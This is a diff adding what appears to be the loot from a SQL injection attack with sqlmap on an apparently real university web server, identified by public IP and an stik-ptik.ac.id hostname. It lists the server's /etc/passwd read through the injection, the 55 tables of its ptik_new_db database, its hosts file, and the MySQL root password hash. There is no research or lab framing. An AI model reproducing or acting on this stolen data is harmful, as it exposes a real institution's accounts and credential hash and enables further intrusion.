@@ -1,0 +1,127 @@
+[root@frozbit sqlmap]# cat /root/.sqlmap/output/180.250.75.76/files/_etc_passwd
+at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
+bin:x:1:1:bin:/bin:/bin/bash
+daemon:x:2:2:Daemon:/sbin:/bin/bash
+ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
+games:x:12:100:Games account:/var/games:/bin/bash
+gdm:x:106:110:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
+haldaemon:x:101:102:User for haldaemon:/var/run/hald:/bin/false
+lp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bash
+mail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/false
+man:x:13:62:Manual pages viewer:/var/cache/man:/bin/bash
+messagebus:x:100:101:User for D-Bus:/var/run/dbus:/bin/false
+news:x:9:13:News system:/etc/news:/bin/bash
+nobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash
+ntp:x:74:105:NTP daemon:/var/lib/ntp:/bin/false
+polkituser:x:103:106:PolicyKit:/var/run/PolicyKit:/bin/false
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/false
+pulse:x:104:107:PulseAudio daemon:/var/lib/pulseaudio:/bin/false
+root:x:0:0:root:/root:/bin/bash
+sshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/false
+suse-ncc:x:105:109:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bash
+uucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bash
+uuidd:x:102:103:User for uuidd:/var/run/uuidd:/bin/false
+wwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/false
+ptikuser:x:1000:100:PTIK:/home/ptikuser:/bin/bash
+mysql:x:60:111:MySQL database admin:/var/lib/mysql:/bin/false
+web:x:1001:100::/home/web:/bin/bash
+webmaster:x:1002:100::/home/webmaster:/bin/bash
+fuad:x:1003:100::/home/fuad:/bin/bash
+dnsmasq:x:107:65534:dnsmasq:/var/lib/empty:/bin/false
+sofyan:x:1004:100::/home/sofyan:/bin/bash
+ftpsecure:x:108:65534:Secure FTP User:/var/lib/empty:/bin/false
+seamolec:x:1005:1002::/home/seamolec:/bin/bash
+moodle:x:1006:100::/home/moodle:/bin/bash
+seamol:x:1007:100::/srv/www/htdocs/ptik/moodle:/bin/bash
+seamolec2:x:1008:100::/srv/www/htdocs/ptik/moodle:/bin/bash
+
+Database: ptik_new_db
+[55 tables]
++---------------------+
+| account             |
+| admin_menu          |
+| asnguestbook        |
+| category_galery     |
+| category_news       |
+| contact_us          |
+| content             |
+| content_management  |
+| galery              |
+| hari_libur          |
+| inbox               |
+| jabatan             |
+| link_umum           |
+| lokasi              |
+| management          |
+| menu                |
+| news                |
+| others              |
+| our_relation        |
+| outbox              |
+| phonebook           |
+| ptik_new_db         |
+| satuan_kerja        |
+| sejarah             |
+| slideshow           |
+| social_media        |
+| sponsorship         |
+| statistik           |
+| tbl_agenda          |
+| tbl_akademik        |
+| tbl_article         |
+| tbl_dianmas         |
+| tbl_direktorat      |
+| tbl_direktorat_s1   |
+| tbl_direktorat_s2   |
+| tbl_ebook           |
+| tbl_ejournal        |
+| tbl_fasilitas       |
+| tbl_forum_diskusi   |
+| tbl_forum_post      |
+| tbl_forum_postext   |
+| tbl_forum_tanggapan |
+| tbl_forum_topic     |
+| tbl_isppi           |
+| tbl_mahasiswa       |
+| tbl_menu            |
+| tbl_minwa           |
+| tbl_polling         |
+| tbl_polling_answer  |
+| tbl_ppitk           |
+| tbl_program         |
+| tbl_yaptik          |
+| theme               |
+| video               |
+| visi_misi           |
++---------------------+
+
+180.250.75.76
+
+#
+# hosts         This file describes a number of hostname-to-address
+#               mappings for the TCP/IP subsystem.  It is mostly
+#               used at boot time, when no name servers are running.
+#               On small systems, this file can be used instead of a
+#               "named" name server.
+# Syntax:
+#
+# IP-Address  Full-Qualified-Hostname  Short-Hostname
+#
+
+127.0.0.1       localhost
+
+# special IPv6 addresses
+::1             localhost ipv6-localhost ipv6-loopback
+
+fe00::0         ipv6-localnet
+
+ff00::0         ipv6-mcastprefix
+ff02::1         ipv6-allnodes
+ff02::2         ipv6-allrouters
+ff02::3         ipv6-allhosts
+180.250.75.76   ptik3.stik-ptik.ac.id ptik3
+
+
+database management system users password hashes:
+[*] root [1]:
+    password hash: *717B820C1EEB7A102261BA109A38070B5028B4EB
